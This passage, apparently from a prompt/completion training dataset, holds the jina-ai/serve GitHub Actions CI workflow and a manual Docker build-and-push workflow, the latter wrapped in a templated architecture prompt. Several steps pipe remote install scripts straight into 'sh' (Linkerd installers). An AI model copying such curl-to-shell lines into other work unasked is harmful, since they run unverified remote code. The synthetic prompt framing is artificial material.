--proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_graceful_request_handling.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-failures-test:\n    needs: [ lint-flake-8, code-injection ]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: 3.8\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test k8s failures\n        run: |\n          export LINKERD2_VERSION=stable-2.11.4\n          curl --proto '=https' --tlsv1.2 -sSfL https://run.linkerd.io/install | sh\n          curl --proto '=https' --tlsv1.2 -sSfL https://linkerd.github.io/linkerd-smi/install | sh\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/k8s/test_k8s_failures.py\n        timeout-minutes: 45\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  k8s-otel-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n          curl -LO https://dl.k8s.io/release/v1.21.1/bin/linux/amd64/kubectl\n          sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test K8s with OpenTelemetry\n        run: |\n          pytest -v -s --cov=jina --cov-report=xml ./tests/k8s_otel\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  docker-compose-test:\n    needs: [lint-flake-8, code-injection]\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install \".[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n      - name: Test docker compose\n        run: |\n          pytest -v -s --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml ./tests/docker_compose/test_*.py\n        timeout-minutes: 30\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  prep-testbed:\n    runs-on: ubuntu-latest\n    needs: [ lint-flake-8, code-injection]\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - id: set-matrix\n        run: |\n          sudo apt-get install jq\n          export value=$(bash scripts/get-all-test-paths.sh)\n          echo \"matrix=$value\" >> $GITHUB_OUTPUT\n    outputs:\n      matrix: ${{ steps.set-matrix.outputs.matrix }}\n\n  docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/unit/serve/runtimes/test_helper.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/deployment_http_composite\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_singleton.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_parameters_as_pydantic.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_streaming.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/csp\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/docker\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_v2.py\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/docarray_v2/test_errors.py\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 60\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n\n  stateful-docarray-v-two-test:\n    needs: prep-testbed\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        protobuf-version: ['==3.19.6', '']\n        pydantic-version: ['==1.10.3', '<3.0.0']\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          # Take into account in the `test-pip` the versions\n          docker build --build-arg PYDANTIC_VERSION=\"${{ matrix.pydantic-version }}\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[common,devel,test]\" --no-cache-dir\n          if [[ \"${{ matrix.protobuf-version }}\" == \"==3.19.6\" ]]; then\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.47.5 grpcio-reflection==1.47.5 grpcio-health-checking==1.47.5\n          else\n            pip install -U protobuf${{ matrix.protobuf-version }} grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          fi\n          pip install pydantic\"${{ matrix.pydantic-version }}\"\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test stateful\n        id: test_stateful\n        run: |\n          JINA_LOG_LEVEL=DEBUG JINA_RANDOM_PORT_MAX=\"60535\" pytest --suppress-no-test-exit-code --maxfail 1 --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/hub_usage/dummyhub*' tests/integration/stateful\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  # Build the wheels for Linux and macOS for Python 3.8 and newer\n  build-wheels:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      # Ensure that a wheel builder finishes even if another fails\n      fail-fast: false\n      matrix:\n        include:\n          # linux\n          - os: ubuntu-latest\n            python: '3.8'\n            python-manylinux-tag: \"cp38-cp38\"\n          - os: ubuntu-latest\n            python: '3.9'\n            python-manylinux-tag: \"cp39-cp39\"\n          - os: ubuntu-latest\n            python: '3.10'\n            python-manylinux-tag: \"cp310-cp310\"\n          - os: ubuntu-latest\n            python: '3.11'\n            python-manylinux-tag: \"cp311-cp311\"\n\n          # MacOS emulated\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_x86_64\n            arch: x86_64\n            goarch: amd64\n\n          # MacOS native\n          - os: macos-latest\n            python: '3.8'\n            python-cibuildwheels: '38'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.9'\n            python-cibuildwheels: '39'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.10'\n            python-cibuildwheels: '310'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n          - os: macos-latest\n            python: '3.11'\n            python-cibuildwheels: '311'\n            platform_id: macosx_arm64\n            arch: arm64\n            goarch: arm64\n\n    steps:\n      - name: Check out repository\n        uses: actions/checkout@v2.5.0\n\n      - name: Set up Python ${{ matrix.python }}\n        uses: actions/setup-python@v2\n        with:\n          python-version: ${{ matrix.python }}\n\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        if: ${{ matrix.os == 'ubuntu-latest' }}\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons ${{ matrix.python-manylinux-tag }}\n\n      - name: Build wheels with cibuildwheels on macos\n        env:\n          CIBW_BUILD: cp${{ matrix.python-cibuildwheels }}-${{ matrix.platform_id }}\n          CIBW_ARCHS: ${{ matrix.arch }}\n          CIBW_TEST_COMMAND: python -c \"import jina; import jraft\"\n          CIBW_BUILD_VERBOSITY: 1\n          GOARCH: ${{ matrix.goarch }}\n          CGO_ENABLED: 1\n        if: ${{ matrix.os == 'macos-latest' }}\n        run: |\n          python -m cibuildwheel --output-dir dist\n\n      - name: Upload wheels as artifacts\n        uses: actions/upload-artifact@v4\n        with:\n          name: artifacts-${{ strategy.job-index }}\n          path: dist/*.whl\n\n  core-test:\n    needs: [prep-testbed]\n    runs-on: ubuntu-latest\n    env:\n      JINA_RANDOM_PORT_MIN: 16384\n    strategy:\n      fail-fast: false\n      matrix:\n        python-version: [\"3.10\"]\n        test-path: ${{fromJson(needs.prep-testbed.outputs.matrix)}}\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Set up Golang\n        uses: actions/setup-go@v2\n        with:\n          go-version: 1.19.5\n\n      - name: Install dependencies\n        run: |\n          python -m pip install --upgrade pip\n          pip install setuptools wheel\n          pip install git+https://github.com/jina-ai/setuptools-golang.git@feat-align-with-alaeddine-code\n          pip install cibuildwheel\n\n      - name: Build wheels with setuptools-golang-build-manylinux-wheel\n        run: |\n          setuptools-golang-build-manylinux-wheels --pythons cp310-cp310\n      - name: Prepare environment\n        run: |\n          docker build --build-arg DOCARRAY_VERSION=\"0.21.0\" --build-arg PYDANTIC_VERSION=\"==1.10.3\" -f Dockerfiles/test-pip.Dockerfile -t jinaai/jina:test-pip .\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          WHEEL_FILE=$(ls dist/*whl)\n          pip install \"$WHEEL_FILE[all]\" --no-cache-dir\n          pip install docarray==0.21.0\n          pip install pydantic==1.10.3\n          pip install grpcio==1.65.5 grpcio-reflection==1.65.5 grpcio-health-checking==1.65.5\n          jina\n          export JINA_LOG_LEVEL=\"ERROR\"\n      - name: Test\n        id: test\n        run: |\n          pytest --suppress-no-test-exit-code --force-flaky --min-passes 1 --max-runs 5 --cov=jina --cov-report=xml --timeout=600 -v -s --ignore-glob='tests/integration/docarray_v2/*' --ignore-glob='tests/integration/stateful/*' --ignore-glob='tests/integration/hub_usage/dummyhub*' ${{ matrix.test-path }}\n          if [[ \"${{ matrix.test-path }}\" == *\"tests/integration/instrumentation/\" ]]\n          then\n            echo \"sleeping to let open telemetry export daemon thread expire by itself\"\n            sleep 2\n          fi\n          echo \"flag it as jina for codeoverage\"\n          echo \"codecov_flag=jina\" >> $GITHUB_OUTPUT\n        timeout-minutes: 30\n        env:\n          JINA_AUTH_TOKEN: \"${{ secrets.JINA_AUTH_TOKEN }}\"\n      - name: Check codecov file\n        id: check_files\n        uses: andstor/file-existence-action@v1\n        with:\n          files: \"coverage.xml\"\n      - name: Upload coverage from test to Codecov\n        uses: codecov/codecov-action@v3.1.1\n        if: steps.check_files.outputs.files_exists == 'true' && ${{ matrix.python-version }} == '3.10'\n        with:\n          file: coverage.xml\n          name: ${{ matrix.test-path }}-codecov\n          flags: ${{ steps.test.outputs.codecov_flag }}\n          fail_ci_if_error: false\n\n  import-test:\n    runs-on: ubuntu-latest\n    needs: [lint-flake-8, code-injection ]\n    strategy:\n      fail-fast: false\n      matrix:\n        core: ['', 'true']\n        perf: ['', 'true']\n        python-version: [\"3.8\", \"3.9\", \"3.10\", \"3.11\"]\n        exclude:\n          - core: 'true'\n            perf: 'true'\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python ${{ matrix.python-version }}\n        uses: actions/setup-python@v4\n        with:\n          python-version: ${{ matrix.python-version }}\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n          pip install --no-cache-dir .\n          pip list\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests,Client,Flow,dynamic_batching,Document,DocumentArray'\n      - name: Test import all\n        run: python -c 'from jina import *'\n\n  install-jina-ecosystem-test:\n    runs-on: ubuntu-latest\n    needs: [lint-flake-8, code-injection ]\n    strategy:\n      fail-fast: false\n    steps:\n      - uses: actions/checkout@v2.5.0\n      - name: Set up Python 3.10\n        uses: actions/setup-python@v4\n        with:\n          python-version: \"3.10\"\n      - name: Prepare enviroment\n        run: |\n          python -m pip install --upgrade pip\n          python -m pip install wheel\n\n          HUBBLE_VERSION=$(curl -L -s \"https://pypi.org/pypi/jina-hubble-sdk/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          DOCARRAY_VERSION=$(curl -L -s \"https://pypi.org/pypi/docarray/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n          JCLOUD_VERSION=$(curl -L -s \"https://pypi.org/pypi/jcloud/json\" |  jq  -r '.releases | keys | .[]| select(startswith(\"0.\"))'  | sort -V | tail -1)\n\n          pip install . jcloud==$JCLOUD_VERSION docarray==$DOCARRAY_VERSION jina-hubble-sdk==$HUBBLE_VERSION\n        env:\n          JINA_PIP_INSTALL_CORE: ${{ matrix.core }}\n          JINA_PIP_INSTALL_PERF: ${{ matrix.perf }}\n\n      - name: Test basic import\n        run: python -c 'from jina import Executor,requests'\n      - name: Test import all\n        run: python -c 'from jina import *'\n\n\n  # just for blocking the merge until all parallel core-test are successful\n  success-all-test:\n    runs-on: ubuntu-latest\n    needs: [commit-lint, core-test, docarray-v-two-test, stateful-docarray-v-two-test, import-test, k8s-flow-test, k8s-deployment-test, k8s-graceful-test, k8s-failures-test, k8s-otel-test, docker-compose-test, docker-image-test, check-docstring, check-black, code-injection, build-wheels]\n\n    if: always()\n    steps:\n      - uses: technote-space/workflow-conclusion-action@v2\n      - name: Check Failure\n        if: env.WORKFLOW_CONCLUSION == 'failure'\n        run: exit 1\n      - name: Success\n        if: ${{ success() }}\n        run: echo \"All Done\"\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/ci.yml", "language": "yaml", "complexity": "complex", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 835}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "cloud_architecture", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design cloud-native architecture with serverless and container patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "name: Manual Docker Build\n\non:\n  workflow_dispatch:\n    inputs:\n      release_token:\n        description: 'Your release token'\n        required: true\n      triggered_by:\n        description: 'CD | TAG | MANUAL'\n        required: false\n        default: MANUAL\n\njobs:\n  token-check:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check release token\n        id: token-check\n        run: | \n          touch SUCCESS\n        if: inputs.release_token == env.release_token\n        env:\n          release_token: ${{ secrets.JINA_CORE_RELEASE_TOKEN }}\n      - name: Fail release token\n        run: |\n          [[ -f SUCCESS ]]\n\n\n  regular-release:\n    needs: token-check\n    runs-on: ubuntu-latest\n    strategy:\n      fail-fast: false\n      matrix:\n        pip_tag: [ \"\", \"perf\", \"standard\", \"devel\"]  # default: \"\" = core\n        py_version: [ \"3.7\", \"3.8\", \"3.9\" , \"3.10\", \"3.11\"]  # default \"\" = 3.7\n    steps:\n      - uses: actions/checkout@v2.5.0\n        with:\n          fetch-depth: 100\n      - name: Set envs and versions\n        run: |\n          DEFAULT_PY_VERSION=\"3.8\"\n          VCS_REF=${{ github.ref }}\n          echo \"VCS_REF=$VCS_REF\" >> $GITHUB_ENV\n          echo \"Will build $VCS_REF\"\n          echo \"BUILD_DATE=$(date -u +'%Y-%m-%dT%H:%M:%SZ')\" >> $GITHUB_ENV\n          echo \"BUILD_TARGET=jina\" >> $GITHUB_ENV\n\n          if [[ \"${{ matrix.pip_tag }}\" == \"perf\" ]]; then\n            echo \"JINA_PIP_INSTALL_PERF=1\" >> $GITHUB_ENV\n          fi\n\n          if [[ \"${{ matrix.pip_tag }}\" == \"\" ]]; then\n            echo \"JINA_PIP_INSTALL_CORE=1\" >> $GITHUB_ENV\n          fi\n\n          JINA_VERSION=$(sed -n '/^__version__/p' ./jina/__init__.py | cut -d \\' -f2)\n          V_JINA_VERSION=v${JINA_VERSION}\n          JINA_MINOR_VERSION=${JINA_VERSION%.*}\n          JINA_MAJOR_VERSION=${JINA_MINOR_VERSION%.*}\n\n          PY_TAG=${{matrix.py_version}}\n          if [ -n \"${PY_TAG}\" ]; then\n            PY_TAG=-py${PY_TAG//./}\n          fi\n\n          PIP_TAG=${{ matrix.pip_tag }}\n          if [ -n \"${PIP_TAG}\" ]; then\n              PIP_TAG=-${PIP_TAG}\n          fi\n          \n          git fetch --depth=1 origin +refs/tags/*:refs/tags/*\n          LAST_VER_TAG=$(git tag -l | sort -V | tail -n1)\n          PRE_VERSION=-dev$(git rev-list $LAST_VER_TAG..HEAD --count)\n\n          if [[ \"${{ github.event.inputs.triggered_by }}\" == \"CD\" ]]; then\n\n            if [[ \"${{ matrix.py_version }}\" == \"$DEFAULT_PY_VERSION\" ]]; then\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:master${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:master${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PRE_VERSION}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PRE_VERSION}${PY_TAG}${PIP_TAG}\" \\\n                              >> $GITHUB_ENV\n            else\n              # on every CD\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:master${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PRE_VERSION}${PY_TAG}${PIP_TAG}\" \\\n                              >> $GITHUB_ENV\n            fi\n\n          elif [[ \"${{ github.event.inputs.triggered_by }}\" == \"TAG\" ]]; then\n            # on every tag release\n\n            if [[ \"${{ matrix.py_version }}\" == \"$DEFAULT_PY_VERSION\" ]]; then\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:latest${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MINOR_VERSION}${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MAJOR_VERSION}${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:latest${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MINOR_VERSION}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MAJOR_VERSION}${PIP_TAG} \\\n                              \" >> $GITHUB_ENV\n            else\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:latest${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MINOR_VERSION}${PY_TAG}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_MAJOR_VERSION}${PY_TAG}${PIP_TAG} \\\n                              \" >> $GITHUB_ENV\n            fi\n          elif [[ \"${{ github.event.inputs.triggered_by }}\" == \"MANUAL\" ]]; then\n            # on every manual release\n            if [[ \"${{ matrix.py_version }}\" == \"$DEFAULT_PY_VERSION\" ]]; then\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:${JINA_VERSION}${PIP_TAG}, \\\n                              jinaai/jina:${JINA_VERSION}${PY_TAG}${PIP_TAG} \\\n                              \" >> $GITHUB_ENV\n            else\n              echo \"TAG_ALIAS=\\\n                              jinaai/jina:${JINA_VERSION}${PY_TAG}${PIP_TAG} \\\n                              \" >> $GITHUB_ENV\n            fi\n          else\n            echo \"Bad triggered_by: ${{ github.event.inputs.triggered_by }}!\"\n            exit 1\n          fi\n\n          echo \"JINA_VERSION=${JINA_VERSION}\" >> $GITHUB_ENV\n\n      - name: Set up Docker Buildx\n        id: buildx\n        uses: docker/setup-buildx-action@v1\n        with:\n          install: true\n      - name: Login to DockerHub\n        uses: docker/login-action@v1\n        with:\n          username: ${{ secrets.DOCKERHUB_DEVBOT_USER }}\n          password: ${{ secrets.DOCKERHUB_DEVBOT_TOKEN }}\n      - run: |\n          # https://github.com/docker/buildx/issues/464#issuecomment-741507760\n          # https://github.com/kubernetes-sigs/azuredisk-csi-driver/pull/808/files\n          docker run --privileged --rm tonistiigi/binfmt --uninstall qemu-aarch64\n          docker run --rm --privileged tonistiigi/binfmt --install all\n      - name: Build and push\n        uses: docker/build-push-action@v2\n        with:\n          context: .\n          file: Dockerfiles/debianx.Dockerfile\n          platforms: linux/amd64,linux/arm64\n          push: true\n          tags: ${{env.TAG_ALIAS}}\n          build-args: |\n            BUILD_DATE=${{env.BUILD_DATE}}\n            JINA_VERSION=${{env.JINA_VERSION}}\n            VCS_REF=${{env.VCS_REF}}\n            PIP_INSTALL_CORE=${{env.JINA_PIP_INSTALL_CORE}}\n            PIP_INSTALL_PERF=${{env.JINA_PIP_INSTALL_PERF}}\n            PY_VERSION=${{matrix.py_version}}\n            PIP_TAG=${{matrix.pip_tag}}\n          target: ${{env.BUILD_TARGET}}\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": ".github/workflows/force-docker-build.yml", "language": "yaml", "complexity": "medium", "star_count": 21665, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": 